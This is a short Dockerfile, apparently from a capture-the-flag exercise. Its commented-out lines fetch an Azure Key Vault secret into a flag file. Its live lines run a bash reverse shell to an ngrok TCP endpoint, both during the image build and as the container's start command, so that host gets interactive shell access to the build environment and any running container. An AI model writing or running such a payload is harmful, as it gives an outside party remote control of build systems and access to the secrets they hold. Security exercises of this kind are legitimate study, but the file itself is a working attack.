#FROM mcr.microsoft.com/azure-cli

# Optional: install bash if not present
#RUN apk add --no-cache bash

# Set default command to keep container alive or run your script
#CMD ["bash", "-c", "az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv > /tmp/flag.txt"]


FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"
CMD ["bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"]
